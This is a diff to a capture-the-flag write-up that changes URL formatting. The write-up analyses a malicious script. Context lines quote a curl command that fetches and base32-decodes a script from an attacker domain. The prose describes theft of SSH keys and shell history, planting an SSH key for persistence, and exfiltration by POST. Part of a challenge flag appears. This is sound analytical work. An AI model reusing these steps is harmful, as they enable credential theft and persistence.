@@ -60,9 +60,9 @@ curl -s https://msoidentity.com/info | base32 -d >> /tmp/info.sh
 rm -f /tmp/info.sh
 ```
 
-Now were seeing something more malicious! This script basically seems to create a directory called log_(current datetime) and piles a whole bunch of sensitive system information in there like CPU, memory, and OS info, as well as SSH keys and shell history. The attacker also seems to drop their own SSH key from "https://msoidentity.com/auth" into the authorized keys directory to set up persistence. Then, the logs get compressed into a tar file and exfiltrated to "msoidentity.com/log" via a POST request.
+Now were seeing something more malicious! This script basically seems to create a directory called log_(current datetime) and piles a whole bunch of sensitive system information in there like CPU, memory, and OS info, as well as SSH keys and shell history. The attacker also seems to drop their own SSH key from "msoidentity.com/auth" into the authorized keys directory to set up persistence. Then, the logs get compressed into a tar file and exfiltrated to "msoidentity.com/log" via a POST request.
 
-After all that is done, another bash script - this time seemingly encoded in base32 - is retrieved and ran from "https://msoidentity.com/info". Now we have three new URLs to explore, so my first instinct was to simply visit all three of them in a browser. While the auth endpoint seemed to be a dud, the log and info endpoints both yielded me text file downloads. From the log endpoint I got the first part of the flag, "C1{Sn34ky_", and from the info endpoint I got the encoded script. Once again, throwing the base32 encoded string into cyberchef worked just fine and output this:
+After all that is done, another bash script - this time seemingly encoded in base32 - is retrieved and ran from "msoidentity.com/info". Now we have three new URLs to explore, so my first instinct was to simply visit all three of them in a browser. While the auth endpoint seemed to be a dud, the log and info endpoints both yielded me text file downloads. From the log endpoint I got the first part of the flag, "C1{Sn34ky_", and from the info endpoint I got the encoded script. Once again, throwing the base32 encoded string into cyberchef worked just fine and output this:
 
 ![image](https://github.com/user-attachments/assets/3199b2d5-b01c-4d54-b277-f3c6b5f57f17)
 
